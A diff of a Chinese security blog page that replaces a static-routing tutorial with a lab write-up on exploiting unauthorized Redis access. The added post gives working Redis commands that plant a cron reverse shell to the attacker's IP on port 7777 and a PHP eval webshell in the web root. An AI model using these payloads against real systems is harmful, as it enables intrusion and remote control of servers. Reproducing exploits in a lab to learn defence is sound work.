@@ -68,7 +68,7 @@
 
 
 
-  <meta name="keywords" content="网络基础," />
+  <meta name="keywords" content="漏洞复现," />
 
 
 
@@ -79,23 +79,29 @@
 
 
 
-<meta name="description" content="eNSP静态路由配置序这篇文章的内容来自老师上课布置的一个任务，配置静态路由，想学习好网络安全，这种网络协议的基础是必须要掌握的，也是为了之后的入侵检测系统学习打下基础">
-<meta name="keywords" content="网络基础">
+<meta name="description" content="redis未授权访问漏洞的几种利用方式这篇文章记录一下redis未授权访问漏洞的几种利用方式 漏洞利用环境靶机：centos6.4:192.168.0.104，开启了redis-server，由于配置不当而存在redis未授权访问 攻击机：kali2.0：192.168.0.101，用来攻击配置不当导致存在redis未授权访问漏洞的centos6.4 修改centos中redis配置文件redis">
+<meta name="keywords" content="漏洞复现">
 <meta property="og:type" content="article">
-<meta property="og:title" content="eNSP静态路由配置">
-<meta property="og:url" content="http://yoursite.com/2018/03/18/routestatic/index.html">
+<meta property="og:title" content="redis未授权访问漏洞的几种利用方式">
+<meta property="og:url" content="http://yoursite.com/2018/08/19/redis/index.html">
 <meta property="og:site_name" content="Climber">
-<meta property="og:description" content="eNSP静态路由配置序这篇文章的内容来自老师上课布置的一个任务，配置静态路由，想学习好网络安全，这种网络协议的基础是必须要掌握的，也是为了之后的入侵检测系统学习打下基础">
+<meta property="og:description" content="redis未授权访问漏洞的几种利用方式这篇文章记录一下redis未授权访问漏洞的几种利用方式 漏洞利用环境靶机：centos6.4:192.168.0.104，开启了redis-server，由于配置不当而存在redis未授权访问 攻击机：kali2.0：192.168.0.101，用来攻击配置不当导致存在redis未授权访问漏洞的centos6.4 修改centos中redis配置文件redis">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:image" content="http://p008biu9n.bkt.clouddn.com/blog/180318/fBGD2l9b88.png?imageslim">
-<meta property="og:image" content="http://p008biu9n.bkt.clouddn.com/blog/180319/GH301D7akb.png?imageslim">
-<meta property="og:image" content="http://p008biu9n.bkt.clouddn.com/blog/180319/B5mBkk2hmA.png?imageslim">
-<meta property="og:image" content="http://p008biu9n.bkt.clouddn.com/blog/180319/1jj7hDj12C.png?imageslim">
-<meta property="og:updated_time" content="2018-06-04T15:11:47.911Z">
+<meta property="og:image" content="http://p008biu9n.bkt.clouddn.com/blog/180819/L7g94HcIji.png?imageslim">
+<meta property="og:image" content="http://p008biu9n.bkt.clouddn.com/blog/180819/8E377C775B.png?imageslim">
+<meta property="og:image" content="http://p008biu9n.bkt.clouddn.com/blog/180819/DF7D9Cm9AG.png?imageslim">
+<meta property="og:image" content="http://p008biu9n.bkt.clouddn.com/blog/180819/AelG2eB0m2.png?imageslim">
+<meta property="og:image" content="http://p008biu9n.bkt.clouddn.com/blog/180819/56CBadKaEl.png?imageslim">
+<meta property="og:image" content="http://p008biu9n.bkt.clouddn.com/blog/180819/l2k14IibBm.png?imageslim">
+<meta property="og:image" content="http://p008biu9n.bkt.clouddn.com/blog/180819/Bc3EL7h89K.png?imageslim">
+<meta property="og:image" content="http://p008biu9n.bkt.clouddn.com/blog/180819/DE4e2A3L0D.png?imageslim">
+<meta property="og:image" content="http://p008biu9n.bkt.clouddn.com/blog/180819/670dgDIH27.png?imageslim">
+<meta property="og:image" content="http://p008biu9n.bkt.clouddn.com/blog/180819/2D4BG6ebkA.png?imageslim">
+<meta property="og:updated_time" content="2018-08-18T18:36:17.730Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="eNSP静态路由配置">
-<meta name="twitter:description" content="eNSP静态路由配置序这篇文章的内容来自老师上课布置的一个任务，配置静态路由，想学习好网络安全，这种网络协议的基础是必须要掌握的，也是为了之后的入侵检测系统学习打下基础">
-<meta name="twitter:image" content="http://p008biu9n.bkt.clouddn.com/blog/180318/fBGD2l9b88.png?imageslim">
+<meta name="twitter:title" content="redis未授权访问漏洞的几种利用方式">
+<meta name="twitter:description" content="redis未授权访问漏洞的几种利用方式这篇文章记录一下redis未授权访问漏洞的几种利用方式 漏洞利用环境靶机：centos6.4:192.168.0.104，开启了redis-server，由于配置不当而存在redis未授权访问 攻击机：kali2.0：192.168.0.101，用来攻击配置不当导致存在redis未授权访问漏洞的centos6.4 修改centos中redis配置文件redis">
+<meta name="twitter:image" content="http://p008biu9n.bkt.clouddn.com/blog/180819/L7g94HcIji.png?imageslim">
 
 
 
@@ -125,13 +131,13 @@
 
 
 
-  <link rel="canonical" href="http://yoursite.com/2018/03/18/routestatic/"/>
+  <link rel="canonical" href="http://yoursite.com/2018/08/19/redis/"/>
 
 
 
 
 
-  <title>eNSP静态路由配置 | Climber</title>
+  <title>redis未授权访问漏洞的几种利用方式 | Climber</title>
   
 
 
@@ -258,7 +264,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/03/18/routestatic/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/08/19/redis/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Climber">
@@ -275,7 +281,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">eNSP静态路由配置</h1>
+          <h1 class="post-title" itemprop="name headline">redis未授权访问漏洞的几种利用方式</h1>
         
 
         <div class="post-meta">
@@ -287,8 +293,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-03-18T23:32:19+08:00">
-                2018-03-18
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-08-19T01:57:33+08:00">
+                2018-08-19
               </time>
             
 
@@ -310,8 +316,8 @@
               
               
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/网络基础/" itemprop="url" rel="index">
-                    <span itemprop="name">网络基础</span>
+                  <a href="/categories/漏洞复现/" itemprop="url" rel="index">
+                    <span itemprop="name">漏洞复现</span>
                   </a>
                 </span>
 
@@ -347,75 +353,27 @@
       
 
       
-        <h1 id="eNSP静态路由配置"><a href="#eNSP静态路由配置" class="headerlink" title="eNSP静态路由配置"></a>eNSP静态路由配置</h1><h3 id="序"><a href="#序" class="headerlink" title="序"></a>序</h3><p><strong>这篇文章的内容来自老师上课布置的一个任务，配置静态路由，想学习好网络安全，这种网络协议的基础是必须要掌握的，也是为了之后的入侵检测系统学习打下基础</strong><br><a id="more"></a></p>
-<h3 id="课堂给出的拓扑如下"><a href="#课堂给出的拓扑如下" class="headerlink" title="课堂给出的拓扑如下"></a>课堂给出的拓扑如下</h3><p><img src="http://p008biu9n.bkt.clouddn.com/blog/180318/fBGD2l9b88.png?imageslim" alt="mark"></p>
-<p><strong>要求四个路由器之前相互可以通信，自己动手实践了一下,将自己的配置过程记录下来，也算课堂的时间没有白费</strong></p>
-<h3 id="在配置静态路由之前首先要保证路由器与PC之间以及路由器和路由器之间是通的，各路由器上配置如下"><a href="#在配置静态路由之前首先要保证路由器与PC之间以及路由器和路由器之间是通的，各路由器上配置如下" class="headerlink" title="在配置静态路由之前首先要保证路由器与PC之间以及路由器和路由器之间是通的，各路由器上配置如下"></a>在配置静态路由之前首先要保证路由器与PC之间以及路由器和路由器之间是通的，各路由器上配置如下</h3><pre><code>R1
-sy
-sysname r1
-int e0/0/0
-ip add 10.10.10.1 24
-q
-int g0/0/0
-ip add 2.2.2.2 30
-q
-int g0/0/1
-ip add 3.3.3.2 30
-q
-
-R2
-sy
-sysname r2
-int e0/0/0
-ip add 192.168.2.1 24
-q
-int g0/0/0
-ip add 2.2.2.1 30
-1
-int g0/0/1
-ip add 1.1.1.1 30
-q
-
-R3
-sy
-sysname r3
-int e0/0/0
-ip add 172.16.2.1 24
-q
-int g0/0/0
-ip add 4.4.4.1 30
-q
-int g0/0/1
-ip add 3.3.3.1 24
-q
-
-R4
-sy
-sysname r4
-int g0/0/1
-ip add 1.1.1.2 30
-q
-int g0/0/0
-ip add 4.4.4.2 30
-q
-</code></pre><h3 id="配置静态路由"><a href="#配置静态路由" class="headerlink" title="配置静态路由"></a>配置静态路由</h3><p><strong>配置之前要先明白什么是下一跳地址，以拓扑举例，比如PC1要经过路由R1与PC2通讯，那么在路由R1的路由表中，下一跳地址应该为路由R2:2.2.2.1,所以在R1的路由表中添加一条静态路由</strong></p>
-<pre><code>ip route-static 192.168.2.1 255.255.255.0 2.2.2.1
-</code></pre><p><strong>同时要在R2的路由表中添加一条PC2到PC1的静态路由</strong></p>
-<pre><code>ip route-static 10.10.10.1 255.255.255.0 2.2.2.2
-</code></pre><p><strong>了解了上面的基础，剩下的就是在每个路由器里面一一配置，各路由器配置如下</strong> </p>
-<p><strong>PC1到PC2之间的通信配置</strong></p>
-<pre><code>R1：ip route-static 192.168.2.1 255.255.255.0 2.2.2.1
-R2：ip route-static 10.10.10.1 255.255.255.0 2.2.2.2
-</code></pre><p><strong>测试PC1和PC2互通</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180319/GH301D7akb.png?imageslim" alt="mark"><br><strong>PC1到PC3之间的通信配置</strong></p>
-<pre><code>R1：ip route-static 172.16.2.1 255.255.255.0 3.3.3.1
-R3：ip route-static 10.10.10.1 255.255.255.0 3.3.3.2
-</code></pre><p><strong>测试PC1和PC3互通</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180319/B5mBkk2hmA.png?imageslim" alt="mark"><br><strong>PC2到PC3之间的通信配置</strong></p>
-<pre><code>R2：ip route-static 172.16.2.1 255.255.255.0 1.1.1.2
-R4：ip route-static 172.16.2.1 255.255.255.0 4.4.4.1
-R3：ip route-static 192.168.2.1 255.255.255.0 4.4.4.2
-R4：ip route-static 192.168.2.1 255.255.255.0 1.1.1.1
-</code></pre><p><strong>测试PC2和PC3互通</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180319/1jj7hDj12C.png?imageslim" alt="mark"></p>
-
+        <h1 id="redis未授权访问漏洞的几种利用方式"><a href="#redis未授权访问漏洞的几种利用方式" class="headerlink" title="redis未授权访问漏洞的几种利用方式"></a>redis未授权访问漏洞的几种利用方式</h1><p><strong>这篇文章记录一下redis未授权访问漏洞的几种利用方式</strong></p>
+<h3 id="漏洞利用环境"><a href="#漏洞利用环境" class="headerlink" title="漏洞利用环境"></a>漏洞利用环境</h3><p><strong>靶机：centos6.4:192.168.0.104，开启了redis-server，由于配置不当而存在redis未授权访问</strong></p>
+<p><strong>攻击机：kali2.0：192.168.0.101，用来攻击配置不当导致存在redis未授权访问漏洞的centos6.4</strong></p>
+<p><strong>修改centos中redis配置文件redis.conf中的几个地方</strong></p>
+<pre><code>1.bind 127.0.0.1前面需要加上注释符
+2.protected-mode要修改为no
+</code></pre><p><img src="http://p008biu9n.bkt.clouddn.com/blog/180819/L7g94HcIji.png?imageslim" alt="mark"><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180819/8E377C775B.png?imageslim" alt="mark"></p>
+<h3 id="利用redis未授权访问漏洞反弹shell"><a href="#利用redis未授权访问漏洞反弹shell" class="headerlink" title="利用redis未授权访问漏洞反弹shell"></a>利用redis未授权访问漏洞反弹shell</h3><p><strong>首先在centos上开启redis服务</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">./src/redis-server redis.conf</div></pre></td></tr></table></figure>
+<p><img src="http://p008biu9n.bkt.clouddn.com/blog/180819/DF7D9Cm9AG.png?imageslim" alt="mark"></p>
+<p><strong>接下来使用kali上的redis-cli去访问redis-server</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">./src/redis-cli -h 192.168.0.104 -p 6379</div></pre></td></tr></table></figure>
+<p><strong>可以看到由于配置不当导致redis未授权访问漏洞，可以直接进入redis的交互式shell</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180819/AelG2eB0m2.png?imageslim" alt="mark"></p>
+<p><strong>下面通过该redis未授权访问漏洞利用linux任务计划来反弹一个shell到我们的kali上面</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">set</span> aaa <span class="string">"\n\n* * * * * bash -i /dev/tcp/192.168.0.101/7777 0&gt;&amp;1\n\n"</span></div><div class="line">config <span class="built_in">set</span> dir /var/spool/cron</div><div class="line">config <span class="built_in">set</span> dbfilename root</div><div class="line">save</div></pre></td></tr></table></figure>
+<p><img src="http://p008biu9n.bkt.clouddn.com/blog/180819/56CBadKaEl.png?imageslim" alt="mark"><br><strong>在redis的交互shell中依次执行完上述命令后，可以看到成功的在centos的任务计划目录<code>/var/spool/cron</code>下创建了一个任务计划文件root，该文件里面的cron将执行每分钟执行一次向kali反弹shell的操作</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180819/l2k14IibBm.png?imageslim" alt="mark"></p>
+<p><strong>可以看到我们的kali上已经接收到了centos反弹过来的shell，可以执行命令</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180819/Bc3EL7h89K.png?imageslim" alt="mark"></p>
+<h3 id="利用redis未授权访问写webshell"><a href="#利用redis未授权访问写webshell" class="headerlink" title="利用redis未授权访问写webshell"></a>利用redis未授权访问写webshell</h3><p><strong>还可以通过redis未授权访问漏洞向网站根目录写一个webshell</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">set</span> aaa <span class="string">"\n\n&lt;?php @eval(<span class="variable">$_POST</span>['c1imber']);?&gt;\n\n"</span></div><div class="line">config <span class="built_in">set</span> dir /var/www/html</div><div class="line">config <span class="built_in">set</span> dbfilename shell.php</div><div class="line">save</div></pre></td></tr></table></figure>
+<p><img src="http://p008biu9n.bkt.clouddn.com/blog/180819/DE4e2A3L0D.png?imageslim" alt="mark"><br><strong>可以看到成功向网站根目录写了一个webshell</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180819/670dgDIH27.png?imageslim" alt="mark"><br><strong>访问该webshell，php一句话木马被解析</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180819/2D4BG6ebkA.png?imageslim" alt="mark"></p>
+<h3 id="利用redis未授权访问向服务器写入ssh公钥"><a href="#利用redis未授权访问向服务器写入ssh公钥" class="headerlink" title="利用redis未授权访问向服务器写入ssh公钥"></a>利用redis未授权访问向服务器写入ssh公钥</h3>
       
     </div>
     
@@ -432,7 +390,7 @@ R4：ip route-static 192.168.2.1 255.255.255.0 1.1.1.1
       
         <div class="post-tags">
           
-            <a href="/tags/网络基础/" rel="tag"># 网络基础</a>
+            <a href="/tags/漏洞复现/" rel="tag"># 漏洞复现</a>
           
         </div>
       
@@ -445,8 +403,8 @@ R4：ip route-static 192.168.2.1 255.255.255.0 1.1.1.1
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2018/03/12/N1CTF2018/" rel="next" title="N1CTF2018 77777 writeup">
-                <i class="fa fa-chevron-left"></i> N1CTF2018 77777 writeup
+              <a href="/2018/08/19/2018-08-19/" rel="next" title="记一次失败漏洞利用的经历--ubuntu下的redis未授权访问漏洞复现">
+                <i class="fa fa-chevron-left"></i> 记一次失败漏洞利用的经历--ubuntu下的redis未授权访问漏洞复现
               </a>
             
           </div>
@@ -454,10 +412,6 @@ R4：ip route-static 192.168.2.1 255.255.255.0 1.1.1.1
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2018/03/19/kali update error/" rel="prev" title="解决kali执行apt update时报错">
-                解决kali执行apt update时报错 <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -621,7 +575,7 @@ R4：ip route-static 192.168.2.1 255.255.255.0 1.1.1.1
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#eNSP静态路由配置"><span class="nav-number">1.</span> <span class="nav-text">eNSP静态路由配置</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#序"><span class="nav-number">1.0.1.</span> <span class="nav-text">序</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#课堂给出的拓扑如下"><span class="nav-number">1.0.2.</span> <span class="nav-text">课堂给出的拓扑如下</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#在配置静态路由之前首先要保证路由器与PC之间以及路由器和路由器之间是通的，各路由器上配置如下"><span class="nav-number">1.0.3.</span> <span class="nav-text">在配置静态路由之前首先要保证路由器与PC之间以及路由器和路由器之间是通的，各路由器上配置如下</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#配置静态路由"><span class="nav-number">1.0.4.</span> <span class="nav-text">配置静态路由</span></a></li></ol></li></ol></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#redis未授权访问漏洞的几种利用方式"><span class="nav-number">1.</span> <span class="nav-text">redis未授权访问漏洞的几种利用方式</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#漏洞利用环境"><span class="nav-number">1.0.1.</span> <span class="nav-text">漏洞利用环境</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#利用redis未授权访问漏洞反弹shell"><span class="nav-number">1.0.2.</span> <span class="nav-text">利用redis未授权访问漏洞反弹shell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#利用redis未授权访问写webshell"><span class="nav-number">1.0.3.</span> <span class="nav-text">利用redis未授权访问写webshell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#利用redis未授权访问向服务器写入ssh公钥"><span class="nav-number">1.0.4.</span> <span class="nav-text">利用redis未授权访问向服务器写入ssh公钥</span></a></li></ol></li></ol></li></ol></div>
             
 
           </div>
